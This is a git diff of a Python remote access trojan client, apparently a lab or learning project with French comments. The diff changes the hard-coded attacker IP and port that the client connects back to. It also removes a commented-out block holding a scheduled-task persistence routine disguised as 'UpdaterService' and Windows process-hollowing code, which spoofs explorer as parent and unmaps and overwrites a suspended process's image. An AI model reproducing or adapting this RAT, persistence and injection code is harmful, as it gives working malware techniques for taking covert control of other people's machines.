@@ -18,7 +18,7 @@ from cryptography.hazmat.backends import default_backend
 import base64
 import os as crypto_os
 
-ATTACKER_IP = "192.168.56.102" # IP of the attacker's machine
+ATTACKER_IP = "10.0.3.20" # IP of the attacker's machine
 ATTACKER_PORT = 9999
 BUFFER_SIZE = 4096
 RECONNECT_DELAY = 5
@@ -200,139 +200,6 @@ def execute_command(command):
         return "[Error: Command timed out after 30 seconds]"
     except Exception as e:
         return f"[Error executing command: {e}]"
-
-"""def shedule_task_for_user():
-    task_name = "UpdaterService"
-    script_path = os.path.abspath("rat_client.py") 
-    user = getpass.getuser()
-    command = [
-    "schtasks",
-    "/Create",
-    "/SC", "ONLOGON",               # Déclenchement : à l'ouverture de session
-    "/TN", task_name,               # Nom de la tâche
-    "/TR", f'"python3" "{script_path}"',      # Commande à exécuter
-    "/RL", "LIMITED",               # Droits limités (pas admin)
-    "/F",                           # Forcer la création si existe déjà
-    "/RU", user                     # Compte utilisateur courant
-]
-    try:
-        result = subprocess.run(command, capture_output=True, text=True)
-        if result.returncode == 0:
-            print("[+] Tâche planifiée créée avec succès.")
-        else:
-            print("[-] Erreur lors de la création :")
-            print(result.stderr)
-    except Exception as e:
-        print(f"[-] Exception : {e}")
-
-class STARTUPINFOEX(Structure):
-    _fields_ = [("StartupInfo", STARTUPINFOA),
-                ("lpAttributeList", LPVOID)]
-
-class PROCESS_INFORMATION(Structure):
-    _fields_ = [("hProcess", HANDLE),
-                ("hThread", HANDLE),
-                ("dwProcessId", DWORD),
-                ("dwThreadId", DWORD)]
-
-def get_explorer_pid():
-    hwnd = windll.user32.FindWindowA(b"Shell_TrayWnd", None)
-    pid = DWORD()
-    windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
-    return pid.value
-
-def read_file(path):
-    with open(path, "rb") as f:
-        return f.read()
-
-def create_suspended_process(target, parent_pid):
-    size = SIZE_T()
-    # 1. Crée une liste d'attributs vide pour savoir la taille requise
-    windll.kernel32.InitializeProcThreadAttributeList(None, 1, 0, byref(size))
-
-    # 2. Alloue la mémoire pour la vraie liste
-    attr_list = windll.kernel32.HeapAlloc(windll.kernel32.GetProcessHeap(), 0, size.value)
-
-    # 3. Initialise
-    windll.kernel32.InitializeProcThreadAttributeList(attr_list, 1, 0, byref(size))
-
-    # 4. Ouvre le parent
-    hParent = windll.kernel32.OpenProcess(0x00100000 | 0x0400 | 0x0010, False, parent_pid)
-
-    # 5. Ajoute l’attribut parent
-    windll.kernel32.UpdateProcThreadAttribute(attr_list, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
-                                              byref(c_void_p(hParent)), sizeof(c_void_p), None, None)
-
-    si = STARTUPINFOEX()
-    si.StartupInfo.cb = sizeof(si)
-    si.lpAttributeList = attr_list
-    pi = PROCESS_INFORMATION()
-
-    success = windll.kernel32.CreateProcessA(
-        target.encode('utf-8'),
-        None,
-        None,
-        None,
-        False,
-        EXTENDED_STARTUPINFO_PRESENT | 0x4,  # CREATE_SUSPENDED
-        None,
-        None,
-        byref(si),
-        byref(pi)
-    )
-
-    windll.kernel32.DeleteProcThreadAttributeList(attr_list)
-    windll.kernel32.CloseHandle(hParent)
-
-    if not success:
-        return None, None
-    return pi.hProcess, pi.hThread
-
-def get_image_base_address(hThread):
-    ctx = (ctypes.c_char * 1232)()
-    struct.pack_into("I", ctx, 0, 0x10007)  # CONTEXT_FULL
-    if not windll.kernel32.GetThreadContext(hThread, ctx):
-        return None
-    # Rdx (x64) est à offset 0x98 dans CONTEXT
-    return struct.unpack_from("Q", ctx, 0x98)[0]
-
-def inject_and_resume(hProcess, hThread, payload):
-    base_address = get_image_base_address(hThread)
-    if not base_address:
-        return False
-
-    # NtUnmapViewOfSection
-    NtUnmapViewOfSection = ntdll.NtUnmapViewOfSection
-    NtUnmapViewOfSection.argtypes = [HANDLE, PVOID]
-    NtUnmapViewOfSection.restype = DWORD
-    NtUnmapViewOfSection(hProcess, base_address)
-
-    remote_mem = windll.kernel32.VirtualAllocEx(hProcess, base_address, len(payload), 0x3000, 0x40)
-    written = DWORD(0)
-    windll.kernel32.WriteProcessMemory(hProcess, remote_mem, payload, len(payload), byref(written))
-
-    # Modifier le contexte pour faire pointer RIP à la nouvelle base
-    ctx = (ctypes.c_char * 1232)()
-    struct.pack_into("I", ctx, 0, 0x10007)
-    windll.kernel32.GetThreadContext(hThread, ctx)
-    struct.pack_into("Q", ctx, 0x88, remote_mem)  # RCX
-    windll.kernel32.SetThreadContext(hThread, ctx)
-
-    windll.kernel32.ResumeThread(hThread)
-    return True
-
-def perform_hollowing(target_path, payload_path):
-    payload = read_file(payload_path)
-    ppid = get_explorer_pid()
-    hProcess, hThread = create_suspended_process(target_path, ppid)
-    if not hProcess:
-        print("❌ Failed to create process")
-        return
-    if inject_and_resume(hProcess, hThread, payload):
-        print("✅ Hollowing succeeded")
-    else:
-        print(f"❌ Hollowing échoué, code erreur {result}")"""
-
 
 def main():
     debug_print("RAT Client started.")
